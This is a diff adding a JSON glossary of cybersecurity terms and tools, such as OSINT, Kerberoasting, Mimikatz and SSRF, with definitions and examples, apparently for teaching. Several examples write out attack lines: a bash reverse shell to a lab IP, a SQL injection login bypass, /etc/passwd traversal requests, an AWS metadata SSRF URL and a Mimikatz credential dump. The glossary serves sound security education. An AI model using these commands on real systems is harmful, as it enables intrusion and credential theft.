@@ -1,0 +1,242 @@
+[
+  {
+    "term": "OSINT",
+    "type": "Acronym",
+    "definition": "Open Source Intelligence — the practice of collecting and analyzing publicly available information to produce actionable intelligence.",
+    "example": "Maltego and Shodan are popular OSINT tools used during the reconnaissance phase of a pentest."
+  },
+  {
+    "term": "CVE",
+    "type": "Acronym",
+    "definition": "Common Vulnerabilities and Exposures — a standardized identifier for publicly disclosed cybersecurity vulnerabilities, maintained by MITRE.",
+    "example": "CVE-2021-44228 is the identifier for Log4Shell, a critical RCE vulnerability in Apache Log4j."
+  },
+  {
+    "term": "CVSS",
+    "type": "Acronym",
+    "definition": "Common Vulnerability Scoring System — a framework for rating the severity of security vulnerabilities on a scale of 0.0 to 10.0.",
+    "example": "A CVSS score of 9.8 (Critical) typically indicates a remotely exploitable vulnerability requiring no authentication."
+  },
+  {
+    "term": "SIEM",
+    "type": "Acronym",
+    "definition": "Security Information and Event Management — a system that aggregates, correlates, and analyzes log data from across an organization to detect threats in real time.",
+    "example": "Splunk and Microsoft Sentinel are widely deployed SIEMs used by SOC analysts to hunt for anomalies."
+  },
+  {
+    "term": "EDR",
+    "type": "Acronym",
+    "definition": "Endpoint Detection and Response — a security solution that continuously monitors endpoints for suspicious activity and provides tools to investigate and respond to threats.",
+    "example": "CrowdStrike Falcon is an EDR platform capable of detecting fileless malware through behavioral analysis."
+  },
+  {
+    "term": "SOC",
+    "type": "Acronym",
+    "definition": "Security Operations Center — a team of security professionals who monitor, detect, analyze, and respond to cybersecurity incidents around the clock.",
+    "example": "A Tier 1 SOC analyst triages alerts from the SIEM before escalating confirmed incidents to Tier 2."
+  },
+  {
+    "term": "Lateral Movement",
+    "type": "Concept",
+    "definition": "Techniques an attacker uses to progressively move deeper into a network after gaining an initial foothold, pivoting from system to system.",
+    "example": "Using pass-the-hash to authenticate to a domain controller after compromising a workstation is a classic lateral movement technique."
+  },
+  {
+    "term": "Privilege Escalation",
+    "type": "Concept",
+    "definition": "The act of exploiting a vulnerability or misconfiguration to gain higher access rights than originally granted — either vertically (user → admin) or horizontally (user A → user B).",
+    "example": "A SUID misconfiguration on /usr/bin/find can allow a low-privileged user to escalate to root on Linux."
+  },
+  {
+    "term": "Zero-Day",
+    "type": "Concept",
+    "definition": "A vulnerability that is unknown to the software vendor or has no available patch — attackers can exploit it before defenders have any means to remediate.",
+    "example": "Nation-state actors frequently stockpile zero-days for use against high-value targets where detection risk is acceptable."
+  },
+  {
+    "term": "Nmap",
+    "type": "Tool",
+    "definition": "Network Mapper — an open-source tool for network discovery and security auditing that identifies live hosts, open ports, running services, and OS fingerprints.",
+    "example": "nmap -sV -sC -p- 10.10.10.1 performs a full port scan with service version detection and default scripts."
+  },
+  {
+    "term": "Burp Suite",
+    "type": "Tool",
+    "definition": "An integrated platform for web application security testing, featuring an intercepting proxy, scanner, intruder, and repeater for manual and automated testing.",
+    "example": "Burp's Intruder module can brute-force login forms or fuzz parameters to discover injection vulnerabilities."
+  },
+  {
+    "term": "Metasploit",
+    "type": "Tool",
+    "definition": "An open-source penetration testing framework that provides a library of exploits, payloads, and post-exploitation modules for offensive security testing.",
+    "example": "msfvenom can generate a reverse shell payload encoded to evade basic signature detection during a pentest engagement."
+  },
+  {
+    "term": "Shodan",
+    "type": "Tool",
+    "definition": "A search engine for internet-connected devices that indexes banners and metadata from servers, IoT devices, industrial control systems, and more.",
+    "example": "Shodan can reveal exposed Elasticsearch instances or default-credential cameras belonging to a target organization."
+  },
+  {
+    "term": "Wireshark",
+    "type": "Tool",
+    "definition": "An open-source network protocol analyzer that captures and interactively browses traffic on a network interface in real time.",
+    "example": "Filtering by 'http.request.method == POST' in Wireshark quickly isolates form submissions that may leak credentials."
+  },
+  {
+    "term": "IOC",
+    "type": "Acronym",
+    "definition": "Indicator of Compromise — artifacts observed on a network or endpoint that, with high confidence, indicate a security incident has occurred or is in progress.",
+    "example": "A known malware C2 domain appearing in DNS logs is a classic IOC that triggers immediate investigation."
+  },
+  {
+    "term": "TTPs",
+    "type": "Acronym",
+    "definition": "Tactics, Techniques, and Procedures — the behavior patterns and methods used by threat actors, as catalogued by frameworks like MITRE ATT&CK.",
+    "example": "Understanding a threat actor's TTPs helps defenders build detections that survive tool changes between campaigns."
+  },
+  {
+    "term": "MITRE ATT&CK",
+    "type": "Framework",
+    "definition": "A globally accessible knowledge base of adversary tactics and techniques based on real-world observations, used for threat modeling and detection engineering.",
+    "example": "Mapping detections to ATT&CK technique IDs (e.g., T1059 — Command and Scripting Interpreter) helps measure SOC coverage."
+  },
+  {
+    "term": "SQL Injection",
+    "type": "Vulnerability",
+    "definition": "A code injection technique where malicious SQL statements are inserted into an entry field for execution, allowing attackers to manipulate or exfiltrate database contents.",
+    "example": "Submitting ' OR '1'='1 into a login field can bypass authentication if inputs aren't properly parameterized."
+  },
+  {
+    "term": "XSS",
+    "type": "Vulnerability",
+    "definition": "Cross-Site Scripting — an attack where malicious scripts are injected into trusted web pages, executing in victims' browsers to steal cookies or perform actions on their behalf.",
+    "example": "A stored XSS payload in a comment field can hijack every admin session that views the affected page."
+  },
+  {
+    "term": "SSRF",
+    "type": "Vulnerability",
+    "definition": "Server-Side Request Forgery — an attack that tricks a server into making requests to unintended internal or external resources, potentially exposing cloud metadata or internal services.",
+    "example": "Fetching http://169.254.169.254/latest/meta-data/ via an SSRF vulnerability can expose AWS IAM credentials."
+  },
+  {
+    "term": "Path Traversal",
+    "type": "Vulnerability",
+    "definition": "An attack that uses sequences like ../ to navigate outside the intended directory and read or write arbitrary files on the server.",
+    "example": "Requesting /download?file=../../etc/passwd on a vulnerable endpoint can expose the system's user list."
+  },
+  {
+    "term": "C2",
+    "type": "Concept",
+    "definition": "Command and Control — the infrastructure (servers, channels) used by an attacker to communicate with and issue commands to compromised systems (implants/beacons).",
+    "example": "Cobalt Strike and Havoc are popular C2 frameworks used by both red teams and real-world threat actors."
+  },
+  {
+    "term": "Pass-the-Hash",
+    "type": "Technique",
+    "definition": "An authentication attack where a captured NTLM password hash is used directly to authenticate to remote services without cracking the underlying plaintext password.",
+    "example": "Mimikatz can extract NTLM hashes from LSASS memory, which are then used with Impacket's psexec.py to gain remote access."
+  },
+  {
+    "term": "Kerberoasting",
+    "type": "Technique",
+    "definition": "An Active Directory attack where a low-privileged user requests service tickets (TGS) for SPNs and cracks them offline to recover service account passwords.",
+    "example": "Rubeus can request and output TGS tickets in hashcat format, ready for offline dictionary attacks against weak service account passwords."
+  },
+  {
+    "term": "RCE",
+    "type": "Acronym",
+    "definition": "Remote Code Execution — a class of vulnerability that allows an attacker to execute arbitrary code on a target system over a network without physical access.",
+    "example": "The Log4Shell RCE vulnerability (CVE-2021-44228) allowed unauthenticated code execution simply by logging a crafted string."
+  },
+  {
+    "term": "LFI",
+    "type": "Acronym",
+    "definition": "Local File Inclusion — a web vulnerability where user-supplied input is used to include files already present on the server, potentially exposing sensitive content or enabling RCE via log poisoning.",
+    "example": "Appending ?page=../../../../etc/passwd to a PHP include parameter is a textbook LFI test case."
+  },
+  {
+    "term": "Gobuster",
+    "type": "Tool",
+    "definition": "A fast directory and file brute-forcing tool written in Go, used to enumerate hidden web paths, DNS subdomains, and virtual hosts.",
+    "example": "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt quickly uncovers hidden admin panels."
+  },
+  {
+    "term": "Hashcat",
+    "type": "Tool",
+    "definition": "The world's fastest CPU/GPU-based password recovery utility, supporting hundreds of hash types and attack modes including dictionary, brute-force, and rule-based attacks.",
+    "example": "hashcat -m 1000 hashes.txt rockyou.txt cracks NTLM hashes using the rockyou wordlist."
+  },
+  {
+    "term": "Mimikatz",
+    "type": "Tool",
+    "definition": "A post-exploitation tool that extracts plaintext passwords, hashes, PIN codes, and Kerberos tickets from Windows memory (LSASS).",
+    "example": "Running sekurlsa::logonpasswords in Mimikatz can dump all cached credentials from a compromised Windows host."
+  },
+  {
+    "term": "BloodHound",
+    "type": "Tool",
+    "definition": "An Active Directory attack path mapping tool that uses graph theory to reveal hidden and often unintended relationships in an AD environment.",
+    "example": "BloodHound's 'Shortest Path to Domain Admins' query reveals the quickest chain of ACL abuse to fully compromise a domain."
+  },
+  {
+    "term": "OPSEC",
+    "type": "Concept",
+    "definition": "Operations Security — in offensive security, the practice of minimizing your digital footprint to avoid detection during a red team engagement or real-world operation.",
+    "example": "Using living-off-the-land binaries (LOLBins) instead of custom tools is an OPSEC-conscious tradecraft decision."
+  },
+  {
+    "term": "Defense in Depth",
+    "type": "Concept",
+    "definition": "A security strategy that layers multiple controls so that if one fails, others remain to detect or prevent an attack.",
+    "example": "Combining MFA, endpoint EDR, network segmentation, and SIEM monitoring is a defense-in-depth approach."
+  },
+  {
+    "term": "LOLBAS",
+    "type": "Acronym",
+    "definition": "Living Off the Land Binaries and Scripts — legitimate Windows binaries that can be abused by attackers to execute malicious actions while blending in with normal system activity.",
+    "example": "certutil.exe can be abused to download remote payloads, making it a commonly flagged LOLBAS during incident response."
+  },
+  {
+    "term": "Reverse Shell",
+    "type": "Concept",
+    "definition": "A shell session initiated by the target machine back to the attacker's listener, allowing command execution even when inbound connections to the target are firewalled.",
+    "example": "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1 establishes a reverse shell from a compromised Linux host."
+  },
+  {
+    "term": "Pivoting",
+    "type": "Technique",
+    "definition": "Using a compromised host as a relay to access otherwise unreachable network segments during a penetration test.",
+    "example": "Setting up a SOCKS5 proxy through a compromised DMZ host with Chisel allows scanning of internal subnets not directly accessible."
+  },
+  {
+    "term": "Threat Modeling",
+    "type": "Concept",
+    "definition": "A structured process for identifying potential threats, attack vectors, and mitigations for a system before and after deployment.",
+    "example": "Using the STRIDE model to evaluate a new API helps identify spoofing and information disclosure risks early in the SDLC."
+  },
+  {
+    "term": "WAF",
+    "type": "Acronym",
+    "definition": "Web Application Firewall — a security appliance or service that filters and monitors HTTP traffic to and from a web application, blocking common attacks like SQLi and XSS.",
+    "example": "Bypassing a WAF often involves encoding payloads (e.g., URL encoding or Unicode normalization) to evade signature-based rules."
+  },
+  {
+    "term": "Honeypot",
+    "type": "Concept",
+    "definition": "A decoy system or resource intentionally designed to attract attackers, allowing defenders to detect, study, and slow down intrusion attempts.",
+    "example": "A fake domain admin account that never logs in legitimately can alert the SOC immediately when someone attempts to use it."
+  },
+  {
+    "term": "Exfiltration",
+    "type": "Concept",
+    "definition": "The unauthorized transfer of data from a target environment to an attacker-controlled destination, often the final objective of a breach.",
+    "example": "Encoding stolen files in DNS TXT query subdomains is a covert exfiltration technique designed to bypass data loss prevention tools."
+  },
+  {
+    "term": "Fuzzing",
+    "type": "Technique",
+    "definition": "An automated testing technique that inputs unexpected, malformed, or random data into a program to discover crashes, bugs, and security vulnerabilities.",
+    "example": "AFL++ (American Fuzzy Lop) is a popular coverage-guided fuzzer used to discover memory corruption vulnerabilities in native binaries."
+  }
+]
